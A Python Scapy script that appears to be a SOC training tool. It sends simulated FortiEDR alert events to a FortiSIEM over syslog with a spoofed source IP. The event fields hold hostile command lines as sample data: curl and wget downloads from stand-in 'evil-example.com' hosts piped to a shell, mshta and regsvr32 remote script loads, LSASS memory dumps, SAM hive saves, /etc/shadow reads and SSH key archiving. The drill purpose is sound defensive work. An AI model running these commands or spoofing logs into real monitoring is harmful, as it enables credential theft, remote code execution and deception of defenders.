#!/usr/bin/env python3

from scapy.all import IP, UDP, Raw, send
from datetime import datetime
import random
import time

# =========================
# CONFIGURACIÓN
# =========================

FORTISIEM_IP = "10.0.0.50"      # Cambia esto por la IP real de FortiSIEM
FORTISIEM_PORT = 514

FORTIEDR_REPORTING_IP = "172.16.20.110"
FORTIEDR_HOSTNAME = "FORTIEDR-CM-01"

USERS = [
    "corp\\j.garcia",
    "corp\\m.rodriguez",
    "corp\\a.sanchez",
    "corp\\l.martin",
    "corp\\p.lopez",
    "corp\\c.navarro",
    "corp\\r.torres",
    "corp\\n.ruiz",
    "corp\\svc_backup",
    "corp\\svc_sql",
    "nt authority\\system",
    "root",
    "www-data",
    "postgres",
    "monitoring",
]

ENDPOINTS = [
    {"hostname": "MAD-W11-FIN-014", "ip": "10.0.10.30", "os": "Windows 11 Pro 23H2", "os_family": "windows", "group": "Finance Workstations"},
    {"hostname": "MAD-W11-HR-022", "ip": "10.0.10.31", "os": "Windows 11 Enterprise 23H2", "os_family": "windows", "group": "HR Workstations"},
    {"hostname": "MAD-W11-IT-041", "ip": "10.0.10.41", "os": "Windows 11 Pro 23H2", "os_family": "windows", "group": "IT Workstations"},
    {"hostname": "BCN-W11-LEGAL-011", "ip": "10.1.10.11", "os": "Windows 11 Enterprise 23H2", "os_family": "windows", "group": "Legal Workstations"},
    {"hostname": "MAD-SRV-APP-003", "ip": "10.0.20.45", "os": "Windows Server 2019 Standard", "os_family": "windows", "group": "Application Servers"},
    {"hostname": "MAD-SRV-FS-001", "ip": "10.0.20.50", "os": "Windows Server 2022 Standard", "os_family": "windows", "group": "File Servers"},
    {"hostname": "MAD-SRV-SQL-002", "ip": "10.0.20.60", "os": "Windows Server 2019 Datacenter", "os_family": "windows", "group": "Database Servers"},

    {"hostname": "MAD-LNX-WEB-001", "ip": "10.0.30.21", "os": "Ubuntu Server 22.04 LTS", "os_family": "linux", "group": "Linux Web Servers"},
    {"hostname": "MAD-LNX-DB-002", "ip": "10.0.30.22", "os": "Red Hat Enterprise Linux 9", "os_family": "linux", "group": "Linux Database Servers"},
    {"hostname": "MAD-LNX-JMP-001", "ip": "10.0.30.10", "os": "Ubuntu Server 22.04 LTS", "os_family": "linux", "group": "Jump Servers"},
    {"hostname": "BCN-LNX-DOCKER-001", "ip": "10.1.30.40", "os": "Debian GNU/Linux 12", "os_family": "linux", "group": "Container Hosts"},
    {"hostname": "VLC-LNX-MON-001", "ip": "10.2.30.15", "os": "Rocky Linux 9", "os_family": "linux", "group": "Monitoring Servers"},
    {"hostname": "SEV-LNX-BKP-001", "ip": "10.3.30.12", "os": "Ubuntu Server 20.04 LTS", "os_family": "linux", "group": "Backup Servers"},
]

C2_IPS = [
    "45.83.120.10",
    "91.199.212.44",
    "185.203.118.77",
    "193.56.29.101",
]

C2_DOMAINS = [
    "update-checkin-cdn.evil-example.com",
    "api-sync-service.evil-example.com",
    "cdn-telemetry-cache.evil-example.com",
    "edge-service-updater.evil-example.com",
]

WINDOWS_PATHS = [
    r"C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe",
    r"C:\Users\Public\sysupdate.exe",
    r"C:\Windows\Temp\7zS4A1.tmp\setup.exe",
    r"C:\ProgramData\Microsoft\Windows\Caches\msedge_update.exe",
    r"C:\Windows\Tasks\OfficeTelemetryAgent.exe",
]

LINUX_PATHS = [
    "/tmp/.sysupdate",
    "/tmp/.cache/.x11",
    "/var/tmp/kworker",
    "/dev/shm/.dbus-update",
    "/usr/local/bin/systemd-helper",
]

WINDOWS_PROCESSES = [
    "powershell.exe",
    "cmd.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "certutil.exe",
    "bitsadmin.exe",
]

LINUX_PROCESSES = [
    "bash",
    "sh",
    "curl",
    "wget",
    "python3",
    "chmod",
    "systemctl",
    "crontab",
]

MALWARE_NAMES = [
    "W32/Agent.AFD!tr",
    "W64/GenKryptik.AJ!tr",
    "MSIL/Kryptik.ACY!tr",
    "Riskware/PowerShell.Downloader",
    "Suspicious/EncodedPowerShell",
    "Trojan/Win32.RedLineStealer",
    "Backdoor/Win32.AsyncRAT",
    "Linux/Backdoor.Gafgyt",
    "Linux/CoinMiner.A",
    "Malware/Generic.AI.Detected",
]


# =========================
# FUNCIONES BASE
# =========================

def syslog_timestamp():
    return datetime.now().strftime("%b %d %H:%M:%S")


def event_id():
    return f"FEDR-{random.randint(10000000, 99999999)}"


def random_endpoint():
    endpoint = random.choice(ENDPOINTS).copy()

    if endpoint["os_family"] == "windows":
        endpoint["user"] = random.choice([u for u in USERS if "\\" in u])
    else:
        endpoint["user"] = random.choice(["root", "www-data", "postgres", "monitoring", "backup"])

    endpoint["collector_id"] = "COL-" + endpoint["hostname"]
    endpoint["asset_criticality"] = random.choice(["Low", "Medium", "High", "Critical"])

    return endpoint


def random_file_path(endpoint):
    if endpoint["os_family"] == "windows":
        return random.choice(WINDOWS_PATHS)
    return random.choice(LINUX_PATHS)


def random_process(endpoint):
    if endpoint["os_family"] == "windows":
        return random.choice(WINDOWS_PROCESSES)
    return random.choice(LINUX_PROCESSES)


def send_syslog(message):
    payload = f"<134>{syslog_timestamp()} {FORTIEDR_HOSTNAME} {message}"

    packet = (
        IP(src=FORTIEDR_REPORTING_IP, dst=FORTISIEM_IP)
        / UDP(sport=random.randint(20000, 65000), dport=FORTISIEM_PORT)
        / Raw(load=payload.encode())
    )

    send(packet, verbose=False)
    print(f"[+] Sent {FORTIEDR_REPORTING_IP} -> {FORTISIEM_IP}: {message[:140]}")
    time.sleep(1)


def kv(**kwargs):
    parts = []

    for key, value in kwargs.items():
        value = str(value)
        if " " in value or "\\" in value or ":" in value or "/" in value:
            value = value.replace('"', '\\"')
            parts.append(f'{key}="{value}"')
        else:
            parts.append(f"{key}={value}")

    return " ".join(parts)


def fortiedr_event(endpoint, event_type, severity, action, msg, **extra):
    base = {
        "product": "FortiEDR",
        "vendor": "Fortinet",
        "event_id": event_id(),
        "event_type": event_type,
        "severity": severity,
        "action": action,
        "endpoint": endpoint["hostname"],
        "endpoint_ip": endpoint["ip"],
        "os": endpoint["os"],
        "os_family": endpoint["os_family"],
        "user": endpoint["user"],
        "collector_id": endpoint["collector_id"],
        "collector_group": endpoint["group"],
        "asset_criticality": endpoint["asset_criticality"],
        "exercise_id": "SOC-DRILL-FORTIEDR-BASIC",
        "msg": msg,
    }

    base.update(extra)

    return "FortiEDR: " + kv(**base)


# =========================
# EVENTOS
# =========================

def malicious_file_blocked(endpoint):
    process = random_process(endpoint)
    file_path = random_file_path(endpoint)

    return fortiedr_event(
        endpoint,
        event_type="Malicious File Detected",
        severity=random.choice(["High", "Critical"]),
        action=random.choice(["Blocked", "Quarantined"]),
        msg="Malicious file was detected and blocked",
        malware_name=random.choice(MALWARE_NAMES),
        file_path=file_path,
        file_hash_sha256=f"{random.getrandbits(256):064x}",
        process_name=process,
        process_path=file_path,
        policy=random.choice(["Default Prevention Policy", "Workstations Prevention Policy", "Linux Server Prevention Policy"]),
        mitre_tactic="Execution",
        mitre_technique="T1059",
    )


def suspicious_process_blocked(endpoint):
    process = random_process(endpoint)

    if endpoint["os_family"] == "windows":
        command_line = random.choice([
            r"powershell.exe -NoProfile -EncodedCommand <redacted>",
            r"cmd.exe /c whoami && hostname && ipconfig /all",
            r"mshta.exe http://edge-service-updater.evil-example.com/update.hta",
            r"regsvr32.exe /s /n /u /i:http://api-sync-service.evil-example.com/scrobj.sct scrobj.dll",
        ])
        parent_process = random.choice(["explorer.exe", "winword.exe", "outlook.exe", "chrome.exe"])
    else:
        command_line = random.choice([
            "bash -c curl http://update-checkin-cdn.evil-example.com/payload.sh | sh",
            "wget -q http://api-sync-service.evil-example.com/init -O /tmp/.cache/.x11",
            "chmod +x /tmp/.sysupdate && /tmp/.sysupdate --silent",
            "crontab -l; echo '*/15 * * * * /tmp/.sysupdate --beacon' | crontab -",
        ])
        parent_process = random.choice(["sshd", "cron", "systemd", "nginx"])

    return fortiedr_event(
        endpoint,
        event_type="Suspicious Process",
        severity=random.choice(["Medium", "High"]),
        action=random.choice(["Blocked", "Terminated", "Detected"]),
        msg="Suspicious process execution was detected",
        process_name=process,
        command_line=command_line,
        parent_process=parent_process,
        policy=random.choice(["Execution Prevention", "Suspicious Script Control", "Linux Server Prevention Policy"]),
        mitre_tactic="Execution",
        mitre_technique="T1059",
    )


def network_connection_blocked(endpoint):
    dst_ip = random.choice(C2_IPS)
    dst_domain = random.choice(C2_DOMAINS)
    process = random_process(endpoint)

    return fortiedr_event(
        endpoint,
        event_type="Network Connection",
        severity=random.choice(["Medium", "High"]),
        action=random.choice(["Blocked", "Detected"]),
        msg="Outbound connection to suspicious destination was detected",
        process_name=process,
        src_ip=endpoint["ip"],
        src_port=random.randint(30000, 65000),
        dst_ip=dst_ip,
        dst_port=random.choice([80, 443, 8080, 8443]),
        dst_domain=dst_domain,
        protocol="TCP",
        direction="Outbound",
        policy="Communication Control",
        mitre_tactic="Command and Control",
        mitre_technique="T1071.001",
    )


def ransomware_behavior(endpoint):
    file_path = (
        r"C:\Shares\Finance\finance_backup.xlsx.encrypted"
        if endpoint["os_family"] == "windows"
        else "/srv/finance/finance_backup.xlsx.encrypted"
    )

    return fortiedr_event(
        endpoint,
        event_type="Ransomware Behavior",
        severity="Critical",
        action=random.choice(["Blocked", "Terminated", "Isolated"]),
        msg="Ransomware-like file modification behavior detected",
        process_name=random_process(endpoint),
        file_path=file_path,
        affected_files=random.randint(25, 250),
        policy="Ransomware Prevention",
        mitre_tactic="Impact",
        mitre_technique="T1486",
    )


def credential_access(endpoint):
    if endpoint["os_family"] == "windows":
        command_line = random.choice([
            r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full",
            r"procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp",
            r"reg.exe save HKLM\SAM C:\Windows\Temp\sam.save",
        ])
        target_process = "lsass.exe"
    else:
        command_line = random.choice([
            "cat /etc/shadow",
            "tar -czf /tmp/ssh_keys.tgz /home/*/.ssh",
            "grep -R password /etc /home 2>/dev/null",
        ])
        target_process = "credential_files"

    return fortiedr_event(
        endpoint,
        event_type="Credential Access",
        severity=random.choice(["High", "Critical"]),
        action=random.choice(["Blocked", "Terminated"]),
        msg="Credential access behavior detected",
        process_name=random_process(endpoint),
        command_line=command_line,
        target_process=target_process,
        policy=random.choice(["High Security Servers Policy", "Workstations Prevention Policy", "Linux Server Prevention Policy"]),
        mitre_tactic="Credential Access",
        mitre_technique="T1003.001",
    )


def device_isolated(endpoint):
    return fortiedr_event(
        endpoint,
        event_type="Device Isolation",
        severity="High",
        action="Isolated",
        msg="Endpoint was isolated by FortiEDR playbook",
        playbook="Auto Isolate Critical Endpoint",
        trigger=random.choice(["Critical security event", "Ransomware behavior", "Credential access behavior", "C2 connection"]),
        isolation_status="Enabled",
        analyst="auto-playbook",
    )


def collector_status(endpoint):
    connected = random.choice([True, True, True, False])

    return fortiedr_event(
        endpoint,
        event_type="Collector Status",
        severity="Low" if connected else "Medium",
        action="Connected" if connected else "Disconnected",
        msg="FortiEDR collector connected" if connected else "FortiEDR collector disconnected",
        status="Connected" if connected else "Disconnected",
        collector_version=random.choice(["7.2.3", "7.2.4", "7.4.0"]),
    )


# =========================
# MAIN
# =========================

def main():
    print("[+] FortiEDR basic Scapy simulator with random users/endpoints/OS")
    print(f"[+] FortiSIEM: {FORTISIEM_IP}:{FORTISIEM_PORT}/UDP")
    print(f"[+] Reporting IP spoofeada: {FORTIEDR_REPORTING_IP}")
    print(f"[+] Hostname: {FORTIEDR_HOSTNAME}")
    print()

    generators = [
        malicious_file_blocked,
        suspicious_process_blocked,
        network_connection_blocked,
        ransomware_behavior,
        credential_access,
        device_isolated,
        collector_status,
    ]

    for _ in range(15):
        endpoint = random_endpoint()
        generator = random.choice(generators)
        event = generator(endpoint)
        send_syslog(event)

    print()
    print("[+] Envíos finalizados.")
    print("[+] Busca en FortiSIEM:")
    print("    FortiEDR")
    print("    product=FortiEDR")
    print("    exercise_id=SOC-DRILL-FORTIEDR-BASIC")
    print("    Malicious File Detected")
    print("    Suspicious Process")
    print("    Network Connection")
    print("    Ransomware Behavior")
    print("    Credential Access")
    print("    Device Isolation")
    print(f"    Reporting IP = {FORTIEDR_REPORTING_IP}")


if __name__ == "__main__":
    main()
